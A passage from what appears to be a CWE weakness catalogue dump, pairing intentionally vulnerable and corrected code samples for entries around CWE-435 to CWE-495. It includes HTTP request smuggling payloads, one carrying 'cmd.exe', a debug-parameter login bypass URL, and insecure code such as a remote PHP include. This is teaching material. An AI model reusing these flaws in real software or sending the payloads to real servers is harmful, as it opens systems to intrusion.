// verify that content type is multipart form data
if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {

                                 

                                    
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));
...

                                       
// output the file to the local upload directory
try {

                                          
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();

                                       

                                       

                                       
} catch (IOException ex) {...}
// output successful upload response HTML page

                                 
}
// output unsuccessful upload response HTML page
else
{...}

                           
}
...

                        

                     
}

               "
435,
436,
437,
439,
440,
441,
444,"
example: 1
NATURE:attack:
                  
POST http://www.website.com/foobar.html HTTP/1.1
Host: www.website.com
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Content-Length: 44

                     
GET /poison.html HTTP/1.1
Host: www.website.com
Bla: GET http://www.website.com/page_to_poison.html HTTP/1.1
Host: www.website.com
Connection: Keep-Alive

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                        

                           

                           
// Set up response writer object

                           
...
try {

                              

                                 

                                 
// check for multiple content length headers

                                 
Enumeration contentLengthHeaders = request.getHeaders(""Content-Length"");
int count = 0;
while (contentLengthHeaders.hasMoreElements()) {
count++;
}
if (count > 1) {

                                    

                                       

                                       
// output error response

                                       

                                    

                                 
}
else {

                                    

                                       

                                       
// process request

                                       

                                    

                                 
}

                              

                           
} catch (Exception ex) {...}

                     
}

               
example: 3
NATURE:attack:
                  
POST /page.asp HTTP/1.1
Host: www.website.com
Connection: Keep-Alive
Content-Length: 49223

                     
zzz...zzz [""z"" x 49152]
POST /page.asp HTTP/1.0
Connection: Keep-Alive
Content-Length: 30

                     
POST /page.asp HTTP/1.0
Bla: POST /page.asp?cmd.exe HTTP/1.0
Connection: Keep-Alive

               "
446,
447,
448,
449,
450,
451,
453,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  

                     

                     
// $user and $pass automatically set from POST request

                     
if (login_user($user,$pass)) {
$authorized = true;
}

                     
...

                     

                     
if ($authorized) {
generatePage();
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$user = $_POST['user'];
$pass = $_POST['pass'];
$authorized = false;
if (login_user($user,$pass)) {
$authorized = true;
}

                     
...

                     

                  

               "
454,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
int debugLevel = Integer.getInteger(""com.domain.application.debugLevel"").intValue();

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$debugEnabled = false;
if ($_POST[""debug""] == ""true""){
$debugEnabled = true;
}

                     
/.../

                     

                     
function login($username, $password){
if($debugEnabled){
echo 'Debug Activated';
phpinfo();
$isAdmin = True;
return True;
}
}

               "
455,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
$username = GetCurrentUser();
$state = GetStateData($username);
if (defined($state)) {
$uid = ExtractUserID($state);
}

                     

                     
# do stuff

                     

                     
if ($uid == 0) {
DoAdminThings();
}

               "
456,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private User user;
public void someMethod() {

                        

                           

                           
// Do something interesting.

                           
...

                           

                           
// Throws NPE if user hasn't been properly initialized.

                           
String username = user.getName();

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
if (authenticate($username,$password) && setAdmin($username)){
$isAdmin = true;
}

                     
/.../

                     

                     
if ($isAdmin){
deleteUser($userToDelete);
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public class BankManager {

                     

                        

                           

                           
// user allowed to perform bank manager tasks

                           
private User user = null;
private boolean isUserAuthentic = false;

                           

                           
// constructor for BankManager class

                           
public BankManager() {
...
}

                           

                           
// retrieve user from database of users

                           
public User getUserFromUserDatabase(String username){
...
}

                           

                           
// set user variable using username

                           
public void setUser(String username) {
this.user = getUserFromUserDatabase(username);
}

                           

                           
// authenticate user

                           
public boolean authenticateUser(String username, String password) {
if (username.equals(user.getUsername()) && password.equals(user.getPassword())) {
isUserAuthentic = true;
}
return isUserAuthentic;
}

                           

                           
// methods for performing bank manager tasks

                           
...

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public class BankManager {

                     

                        

                           

                           
// user allowed to perform bank manager tasks

                           
private User user = null;
private boolean isUserAuthentic = false;

                           

                           
// constructor for BankManager class

                           
public BankManager(String username) {
user = getUserFromUserDatabase(username);
}

                           

                           
// retrieve user from database of users

                           
public User getUserFromUserDatabase(String username) {...}

                           

                           
// authenticate user

                           
public boolean authenticateUser(String username, String password) {

                              
if (user == null) {
System.out.println(""Cannot find user "" + username);
}
else {
if (password.equals(user.getPassword())) {
isUserAuthentic = true;
}
}
return isUserAuthentic;

                           
}

                           

                              

                                 

                                 
// methods for performing bank manager tasks

                                 
...

                           

                           

                        

                     
}

               "
457,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
if (isset($_POST['names'])) {
$nameArray = $_POST['names'];
}
echo ""Hello "" . $nameArray['first'];

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int aN, Bn;
switch (ctl) {

                        
case -1:
aN = 0;
bN = 0;
break;

                           
case 0:
aN = i;
bN = -i;
break;

                           
case 1:
aN = i + NEXT_SZ;
bN = i - NEXT_SZ;
break;

                           
default:
aN = -1;
aN = -1;
break;

                        

                     
}
repaint(aN, bN);

               "
459,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {
InputStream is = new FileInputStream(path);
byte b[] = new byte[is.available()];
is.read(b);
is.close();
} catch (Throwable t) {
log.error(""Something bad happened: "" + t.getMessage());
}

               "
460,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class foo {

                        
public static final void main( String args[] ) {

                              

                                 
boolean returnValue;
returnValue=doStuff();

                           
}
public static final boolean doStuff( ) {

                              

                                 
boolean threadLock;
boolean truthvalue=true;
try {

                                    

                                       
while(

                                       
//check some condition

                                       
) {

                                          

                                             
threadLock=true; //do some stuff to truthvalue
threadLock=false;

                                       
}

                                 
}
catch (Exception e){

                                    

                                       
System.err.println(""You did something bad"");
if (something) return truthvalue;

                                 
}
return truthvalue;

                           
}

                     
}

               "
462,"
example: 1
NATURE:bad:
LANGUAGE:Python:
                  
alist = []
while (foo()): #now assume there is a string data with a key basename
queue.append(basename,data)
queue.sort()

                  

               "
463,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char *foo;
int counter;
foo=calloc(sizeof(char)*10);

                     
for (counter=0;counter!=10;counter++) {
foo[counter]='a';

                     
printf(""%s\n"",foo);
}

               "
464,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char *foo;
foo=malloc(sizeof(char)*5);
foo[0]='a';
foo[1]='a';
foo[2]=atoi(getc(stdin));
foo[3]='c';
foo[4]='\0'
printf(""%c %c %c %c %c \n"",foo[0],foo[1],foo[2],foo[3],foo[4]);
printf(""%s\n"",foo);

               "
466,
467,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
double *foo;
...
foo = (double *)malloc(sizeof(foo));

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
double *foo;
...
foo = (double *)malloc(sizeof(*foo));

               
example: 3
NATURE:bad:
                  

                     

                     
/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */

                     

                     
char *username = ""admin"";
char *pass = ""password"";

                     
int AuthenticateUser(char *inUser, char *inPass) {

                        
printf(""Sizeof username = %d\n"", sizeof(username));
printf(""Sizeof pass = %d\n"", sizeof(pass));

                           
if (strncmp(username, inUser, sizeof(username))) {
printf(""Auth failure of username using sizeof\n"");
return(AUTH_FAIL);
}

                           
/* Because of CWE-467, the sizeof returns 4 on many platforms and architectures. */

                           

                           
if (! strncmp(pass, inPass, sizeof(pass))) {
printf(""Auth success of password using sizeof\n"");
return(AUTH_SUCCESS);
}
else {
printf(""Auth fail of password using sizeof\n"");
return(AUTH_FAIL);
}

                     
}

                     
int main (int argc, char **argv)
{

                        
int authResult;

                           
if (argc < 3) {
ExitError(""Usage: Provide a username and password"");
}
authResult = AuthenticateUser(argv[1], argv[2]);
if (authResult != AUTH_SUCCESS) {
ExitError(""Authentication failed"");
}
else {
DoAuthenticatedTask(argv[1]);
}

                     
}

               
example: 4
NATURE:attack:
                  
pass5
passABCDEFGH
passWORD

               "
468,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int *p = x;
char * second_char = (char *)(p + 1);

               "
469,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
struct node {
int data;
struct node* next;
};

                     

                     
// Returns the number of nodes in a linked list from

                     

                     

                     
// the given pointer to the head of the list.

                     
int size(struct node* head) {
struct node* current = head;
struct node* tail;
while (current != NULL) {
tail = current;
current = current->next;
}
return tail - head;
}

                     

                     
// other methods for manipulating the list

                     
...

                  

               
example: 2
NATURE:good:
LANGUAGE:C:
                  

                     
...

                     
int size(struct node* head) {
struct node* current = head;
int count = 0;
while (current != NULL) {
count++;
current = current->next;
}
return count;
}

               "
470,"
example: 1
NATURE:good:
LANGUAGE:Java:
                  
String ctl = request.getParameter(""ctl"");
Worker ao = null;
if (ctl.equals(""Add"")) {
ao = new AddCommand();
}
else if (ctl.equals(""Modify"")) {
ao = new ModifyCommand();
}
else {
throw new UnknownActionError();
}
ao.doAction(request);

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String ctl = request.getParameter(""ctl"");
Class cmdClass = Class.forName(ctl + ""Command"");
Worker ao = (Worker) cmdClass.newInstance();
ao.doAction(request);

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
String ctl = request.getParameter(""ctl"");
Class cmdClass = Class.forName(ctl + ""Command"");
Worker ao = (Worker) cmdClass.newInstance();
ao.checkAccessControl(request);
ao.doAction(request);

               "
471,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String[] colors = car.getAllPossibleColors();
colors[0] = ""Red"";

               "
472,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String accountID = request.getParameter(""accountID"");
User user = getUserFromID(Long.parseLong(accountID));

               
example: 2
NATURE:bad:
LANGUAGE:HTML:
                  
<input type=""hidden""

               "
473,
474,
475,
476,"
example: 1
NATURE:good:
                  
if (pointer1 != NULL) {

                        

                           

                           
/* make use of pointer1 */

                           

                           

                           
/* ... */

                           

                        

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
String cmd = System.getProperty(""cmd"");
cmd = cmd.trim();

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
...

                     
IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
...

                     

                     
public class UrlHandlerReceiver extends BroadcastReceiver {

                        
@Override
public void onReceive(Context context, Intent intent) {

                              
if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {
String URL = intent.getStringExtra(""URLToOpen"");
int length = URL.length();

                                 

                                 
...

                                 
}

                           
}

                     
}

               "
477,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
...
getpw(uid, pwdline);
for (i=0; i<3; i++){
cryptpw=strtok(pwdline, "":"");
pwdline=0;
}
result = strcmp(crypt(plainpw,cryptpw), cryptpw) == 0;
...

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String cmd = null;
...
cmd = Environment.GetEnvironmentVariable(""cmd"");
cmd = cmd.Trim();

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
...
String name = new String(nameBytes, highByte);
...

               "
478,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define FAILED 0
#define PASSED 1
int result;
...
result = security_check(data);
switch (result) {

                        
case FAILED:
printf(""Security check failed!\n"");
exit(-1);

                              
//Break never reached because of exit()

                              
break;

                           
case PASSED:
printf(""Security check passed.\n"");
break;

                        

                     
}

                     
// program execution continues...

                     
...

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
#define FAILED 0
#define PASSED 1
int result;
...
result = security_check(data);
switch (result) {

                        
case FAILED:
printf(""Security check failed!\n"");
exit(-1);

                              
//Break never reached because of exit()

                              
break;

                           
case PASSED:
printf(""Security check passed.\n"");
break;

                           
default:
printf(""Unknown error (%d), exiting...\n"",result);
exit(-1);

                        

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public static final String INTEREST_RATE_AT_ZERO_POINTS = ""5.00"";
public static final String INTEREST_RATE_AT_ONE_POINTS = ""4.75"";
public static final String INTEREST_RATE_AT_TWO_POINTS = ""4.50"";
...
public BigDecimal getInterestRate(int points) {

                        
BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);

                           
switch (points) {

                              
case 0:
result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);
break;

                                 
case 1:
result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);
break;

                                 
case 2:
result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);
break;

                              

                           
}
return result;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public static final String INTEREST_RATE_AT_ZERO_POINTS = ""5.00"";
public static final String INTEREST_RATE_AT_ONE_POINTS = ""4.75"";
public static final String INTEREST_RATE_AT_TWO_POINTS = ""4.50"";
...
public BigDecimal getInterestRate(int points) {

                        
BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);

                           
switch (points) {

                              
case 0:
result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);
break;

                                 
case 1:
result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);
break;

                                 
case 2:
result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);
break;

                                 
default:
System.err.println(""Invalid value for points, must be 0, 1 or 2"");
System.err.println(""Returning null value for interest rate"");
result = null;

                              

                           
}

                           
return result;

                     
}

               "
479,"
example: 1
NATURE:bad:
                  
char *message;
void sh(int dummy) {
syslog(LOG_NOTICE,""%s\n"",message);
sleep(10);
exit(0);
}
int main(int argc,char* argv[]) {
...
signal(SIGHUP,sh);
signal(SIGTERM,sh);
sleep(10);
exit(0);
}
If the execution of the first call to the signal handler is suspended after invoking syslog(), and the signal handler is called a second time, the memory allocated by syslog() enters an undefined, and possibly, exploitable state.

                  

               "
480,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int isValid(int value) {
if (value=100) {
printf(""Value is valid\n"");
return(1);
}
printf(""Value is not valid\n"");
return(0);
}

               
example: 2
NATURE:bad:
LANGUAGE:C#:
                  
bool isValid(int value) {
if (value=100) {
Console.WriteLine(""Value is valid."");
return true;
}
Console.WriteLine(""Value is not valid."");
return false;
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
#define SIZE 50
int *tos, *p1, stack[SIZE];

                     
void push(int i) {

                        
p1++;
if(p1==(tos+SIZE)) {

                              

                                 

                                 
// Print stack overflow error message and exit

                                 

                              

                           
}
*p1 == i;

                     
}

                     
int pop(void) {

                        
if(p1==tos) {

                              

                                 

                                 
// Print stack underflow error message and exit

                                 

                              

                           
}
p1--;
return *(p1+1);

                     
}

                     
int main(int argc, char *argv[]) {

                        

                           

                           
// initialize tos and p1 to point to the top of stack

                           
tos = stack;
p1 = stack;

                           
// code to add and remove items from stack

                           
...
return 0;

                     
}

               "
481,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int isValid(int value) {
if (value=100) {
printf(""Value is valid\n"");
return(1);
}
printf(""Value is not valid\n"");
return(0);
}

               
example: 2
NATURE:bad:
LANGUAGE:C#:
                  
bool isValid(int value) {
if (value=100) {
Console.WriteLine(""Value is valid."");
return true;
}
Console.WriteLine(""Value is not valid."");
return false;
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
void processString (char *str) {

                        
int i;

                           
for(i=0; i<strlen(str); i++) {
if (isalnum(str[i])){
processChar(str[i]);
}
else if (str[i] = ':') {
movingToNewInput();}
}
}

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
public void checkValid(boolean isValid) {
if (isValid = true) {
System.out.println(""Performing processing"");
doSomethingImportant();
}
else {
System.out.println(""Not Valid, do not perform processing"");
return;
}
}

               
example: 5
NATURE:good:
LANGUAGE:Java:
                  
public void checkValid(boolean isValid) {
if (isValid) {
System.out.println(""Performing processing"");
doSomethingImportant();
}
else {
System.out.println(""Not Valid, do not perform processing"");
return;
}
}

               
example: 6
NATURE:good:
LANGUAGE:Java:
                  
public void checkValid(boolean isValid) {
if (!isValid) {
System.out.println(""Not Valid, do not perform processing"");
return;
}
System.out.println(""Performing processing"");
doSomethingImportant();
}

               
example: 7
NATURE:bad:
LANGUAGE:C:
                  
void called(int foo){
if (foo=1) printf(""foo\n"");
}
int main() {

                        

                           
called(2);
return 0;

                     
}

               "
482,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
void called(int foo) {
foo==1;
if (foo==1) System.out.println(""foo\n"");
}
int main() {

                        

                           
called(2);
return 0;

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
#define SIZE 50
int *tos, *p1, stack[SIZE];

                     
void push(int i) {

                        
p1++;
if(p1==(tos+SIZE)) {

                              

                                 

                                 
// Print stack overflow error message and exit

                                 

                              

                           
}
*p1 == i;

                     
}

                     
int pop(void) {

                        
if(p1==tos) {

                              

                                 

                                 
// Print stack underflow error message and exit

                                 

                              

                           
}
p1--;
return *(p1+1);

                     
}

                     
int main(int argc, char *argv[]) {

                        

                           

                           
// initialize tos and p1 to point to the top of stack

                           
tos = stack;
p1 = stack;

                           
// code to add and remove items from stack

                           
...
return 0;

                     
}

               "
483,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if (condition==true)
Do_X();
Do_Y();

                  

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
if (condition==true) Do_X();
Do_Y();

                  

               "
484,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public void printMessage(int month){

                        
switch (month) {

                              

                                 
case 1: print(""January"");
case 2: print(""February"");
case 3: print(""March"");
case 4: print(""April"");
case 5: print(""May"");
case 6: print(""June"");
case 7: print(""July"");
case 8: print(""August"");
case 9: print(""September"");
case 10: print(""October"");
case 11: print(""November"");
case 12: print(""December"");

                           
}
println("" is a great month"");

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
void printMessage(int month){

                        
switch (month) {

                              

                                 
case 1: printf(""January"");
case 2: printf(""February"");
case 3: printf(""March"");
case 4: printf(""April"");
case 5: printff(""May"");
case 6: printf(""June"");
case 7: printf(""July"");
case 8: printf(""August"");
case 9: printf(""September"");
case 10: printf(""October"");
case 11: printf(""November"");
case 12: printf(""December"");

                           
}
printf("" is a great month"");

                     
}

               "
486,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
if (inputClass.getClass().getName().equals(""TrustedClassName"")) {

                        

                           

                           
// Do something assuming you trust inputClass

                           

                           

                           
// ...

                           

                        

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
if (inputClass.getClass() == TrustedClass.class) {

                        

                           

                           
// Do something assuming you trust inputClass

                           

                           

                           
// ...

                           

                        

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public class TrustedClass {

                        
...

                           
@Override
public boolean equals(Object obj) {

                              
boolean isEquals = false;

                                 

                                 
// first check to see if the object is of the same class

                                 
if (obj.getClass().getName().equals(this.getClass().getName())) {

                                    

                                       

                                       
// then compare object fields

                                       
...
if (...) {
isEquals = true;
}

                                 
}

                                 
return isEquals;

                           
}

                           
...

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public boolean equals(Object obj) {

                        
...

                           

                           
// first check to see if the object is of the same class

                           
if (obj.getClass() == this.getClass()) {
...
}

                           
...

                     
}

               "
487,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
package math;
public class Lebesgue implements Integration{

                        
public final Static String youAreHidingThisFunction(functionToIntegrate){

                              

                                 
return ...;

                           
}

                     
}

               "
488,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class GuestBook extends HttpServlet {

                        
String name;

                           
protected void doPost (HttpServletRequest req, HttpServletResponse res) {
name = req.getParameter(""name"");
...
out.println(name + "", thanks for visiting!"");
}

                     
}

               "
489,"
example: 1
NATURE:bad:
LANGUAGE:HTML:
                  
<FORM ACTION=""/authenticate_login.cgi"">
<INPUT TYPE=TEXT name=username>
<INPUT TYPE=PASSWORD name=password>
<INPUT TYPE=SUBMIT>
</FORM>

               
example: 2
NATURE:informative:
                  
http://TARGET/authenticate_login.cgi?username=...&password=...

               
example: 3
NATURE:attack:
                  
http://TARGET/authenticate_login.cgi?username=&password=&debug=1

               "
491,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class BankAccount implements Cloneable{

                        
public Object clone(String accountnumber) throws
CloneNotSupportedException
{

                              
Object returnMe = new BankAccount(account number);
...

                              

                           
}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
protected Object clone() throws CloneNotSupportedException {
...
}

               "
492,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public final class urlTool extends Applet {
private final class urlHelper {
...
}
...
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public class OuterClass {

                        
// private member variables of OuterClass

                        
private String memberOne;
private String memberTwo;

                        

                        
// constructor of OuterClass

                        
public OuterClass(String varOne, String varTwo) {
this.memberOne = varOne;
this.memberTwo = varTwo;
}

                        

                        
// InnerClass is a member inner class of OuterClass

                        
private class InnerClass {
private String innerMemberOne;

                           
public InnerClass(String innerVarOne) {
this.innerMemberOne = innerVarOne;
}

                           
public String concat(String separator) {

                              
// InnerClass has access to private member variables of OuterClass

                              
System.out.println(""Value of memberOne is: "" + memberOne);
return OuterClass.this.memberTwo + separator + this.innerMemberOne;
}
}
}

               
example: 3
NATURE:good:
LANGUAGE:Java:
                  
public class OuterClass {

                     

                        

                           

                           
// private member variables of OuterClass

                           
private String memberOne;
private static String memberTwo;

                           

                           
// constructor of OuterClass

                           
public OuterClass(String varOne, String varTwo) {

                           
this.memberOne = varOne;
this.memberTwo = varTwo;
}

                           

                           
// InnerClass is a static inner class of OuterClass

                           
private static class InnerClass {

                              

                                 
private String innerMemberOne;

                                 
public InnerClass(String innerVarOne) {
this.innerMemberOne = innerVarOne;
}
public String concat(String separator) {

                                    

                                       

                                       
// InnerClass only has access to static member variables of OuterClass

                                       
return memberTwo + separator + this.innerMemberOne;

                                 
}

                           
}

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
public class BankAccount {

                        

                           

                           
// private member variables of BankAccount class

                           
private String accountOwnerName;
private String accountOwnerSSN;
private int accountNumber;
private double balance;

                           

                           
// constructor for BankAccount class

                           
public BankAccount(String accountOwnerName, String accountOwnerSSN,
int accountNumber, double initialBalance, int initialRate)
{
this.accountOwnerName = accountOwnerName;
this.accountOwnerSSN = accountOwnerSSN;
this.accountNumber = accountNumber;
this.balance = initialBalance;
this.start(initialRate);
}

                           

                           
// start method will add interest to balance every 30 days

                           

                           

                           
// creates timer object and interest adding action listener object

                           
public void start(double rate)
{
ActionListener adder = new InterestAdder(rate);
Timer t = new Timer(1000 * 3600 * 24 * 30, adder);
t.start();
}

                           

                           
// InterestAdder is an inner class of BankAccount class

                           

                           

                           
// that implements the ActionListener interface

                           
private class InterestAdder implements ActionListener
{

                              
private double rate;

                                 
public InterestAdder(double aRate)
{
this.rate = aRate;
}

                                 
public void actionPerformed(ActionEvent event)
{

                                    

                                       

                                       
// update interest

                                       
double interest = BankAccount.this.balance * rate / 100;
BankAccount.this.balance += interest;

                                 
}

                              

                           
}

                     
}

               
example: 5
NATURE:good:
LANGUAGE:Java:
                  
public class BankAccount {

                        

                           

                           
// private member variables of BankAccount class

                           
private String accountOwnerName;
private String accountOwnerSSN;
private int accountNumber;
private double balance;

                           

                           
// constructor for BankAccount class

                           
public BankAccount(String accountOwnerName, String accountOwnerSSN,
int accountNumber, double initialBalance, int initialRate)
{
this.accountOwnerName = accountOwnerName;
this.accountOwnerSSN = accountOwnerSSN;
this.accountNumber = accountNumber;
this.balance = initialBalance;
this.start(initialRate);
}

                           

                           
// start method will add interest to balance every 30 days

                           

                           

                           
// creates timer object and interest adding action listener object

                           
public void start(final double rate)
{

                              

                                 

                                 
// InterestAdder is a local inner class

                                 

                                 

                                 
// that implements the ActionListener interface

                                 
class InterestAdder implements ActionListener
{

                                    
public void actionPerformed(ActionEvent event)
{

                                          

                                             

                                             
// update interest

                                             
double interest = BankAccount.this.balance * rate / 100;
BankAccount.this.balance += interest;

                                       
}

                                 
}
ActionListener adder = new InterestAdder();
Timer t = new Timer(1000 * 3600 * 24 * 30, adder);
t.start();

                           
}

                     
}

               
example: 6
NATURE:good:
LANGUAGE:Java:
                  
public class BankAccount {

                        

                           

                           
// private member variables of BankAccount class

                           
private String accountOwnerName;
private String accountOwnerSSN;
private int accountNumber;
private double balance;

                           

                           
// constructor for BankAccount class

                           
public BankAccount(String accountOwnerName, String accountOwnerSSN,
int accountNumber, double initialBalance, int initialRate)
{
this.accountOwnerName = accountOwnerName;
this.accountOwnerSSN = accountOwnerSSN;
this.accountNumber = accountNumber;
this.balance = initialBalance;
this.start(initialRate);
}

                           

                           
// start method will add interest to balance every 30 days

                           

                           

                           
// creates timer object and interest adding action listener object

                           
public void start(final double rate)
{

                              

                                 

                                 
// anonymous inner class that implements the ActionListener interface

                                 
ActionListener adder = new ActionListener()
{

                                    
public void actionPerformed(ActionEvent event)
{

                                          

                                             

                                             
// update interest

                                             

                                             

                                             
double interest = BankAccount.this.balance * rate / 100;

                                             
BankAccount.this.balance += interest;

                                       
}

                                 
};

                                 
Timer t = new Timer(1000 * 3600 * 24 * 30, adder);
t.start();

                           
}

                     
}

               
example: 7
NATURE:bad:
                  
public class UrlToolApplet extends Applet {

                        

                           

                           
// private member variables for applet components

                           
private Label enterUrlLabel;
private TextField enterUrlTextField;
private Button submitButton;

                           

                           
// init method that adds components to applet

                           

                           

                           
// and creates button listener object

                           
public void init() {
setLayout(new FlowLayout());
enterUrlLabel = new Label(""Enter URL: "");
enterUrlTextField = new TextField("""", 20);
submitButton = new Button(""Submit"");
add(enterUrlLabel);
add(enterUrlTextField);
add(submitButton);
ActionListener submitButtonListener = new SubmitButtonListener();
submitButton.addActionListener(submitButtonListener);
}

                           

                           
// button listener inner class for UrlToolApplet class

                           
private class SubmitButtonListener implements ActionListener {

                              
public void actionPerformed(ActionEvent evt) {

                                    
if (evt.getSource() == submitButton) {
String urlString = enterUrlTextField.getText();
URL url = null;
try {
url = new URL(urlString);
} catch (MalformedURLException e) {
System.err.println(""Malformed URL: "" + urlString);
}
if (url != null) {
getAppletContext().showDocument(url);
}
}

                                 
}

                           
}

                     
}

               
example: 8
NATURE:good:
LANGUAGE:Java:
                  
public class UrlToolApplet extends Applet implements ActionListener {

                        

                           

                           
// private member variables for applet components

                           
private Label enterUrlLabel;
private TextField enterUrlTextField;
private Button submitButton;

                           

                           
// init method that adds components to applet

                           
public void init() {
setLayout(new FlowLayout());
enterUrlLabel = new Label(""Enter URL: "");
enterUrlTextField = new TextField("""", 20);
submitButton = new Button(""Submit"");
add(enterUrlLabel);
add(enterUrlTextField);
add(submitButton);
submitButton.addActionListener(this);
}

                           

                           
// implementation of actionPerformed method of ActionListener interface

                           
public void actionPerformed(ActionEvent evt) {

                              
if (evt.getSource() == submitButton) {
String urlString = enterUrlTextField.getText();
URL url = null;
try {
url = new URL(urlString);
} catch (MalformedURLException e) {
System.err.println(""Malformed URL: "" + urlString);
}
if (url != null) {
getAppletContext().showDocument(url);
}
}

                           
}

                     
}

               "
493,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public final class WidgetData extends Applet {
public float price;
...
public WidgetData(...) {
this.price = LookupPrice(""MyWidgetType"");
}
}

               
example: 2
NATURE:bad:
LANGUAGE:C++:
                  
public string configPath = ""/etc/application/config.dat"";

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public String configPath = new String(""/etc/application/config.dat"");

               "
494,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
URL[] classURLs= new URL[]{
new URL(""file:subdir/"")
};
URLClassLoader loader = new URLClassLoader(classURLs);
Class loadedClass = Class.forName(""loadMe"", true, loader);

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  

                     
//assume the password is already encrypted, avoiding CWE-312

                     

                     
function authenticate($username,$password){

                        
include(""http://external.example.com/dbInfo.php"");

                        

                        
//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available

                        
mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');
mysql_select_db($dbname);
$query = 'Select * from users where username='.$username.' And password='.$password;
$result = mysql_query($query);

                        
if(mysql_numrows($result) == 1){
mysql_close();
return true;
}
else{
mysql_close();
return false;
}

                     
}

               "
495,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private String[] colors;
public String[] getColors() {
return colors;
}

               
example: 2
NATURE:bad:
LANGUAGE:C++:
                  
class Color
{
private:
int[2] colorArray;
int colorValue;
public:
Color () : colorArray { 1, 2 }, colorValue (3) { };
int[2] & fa () { return colorArray; } 
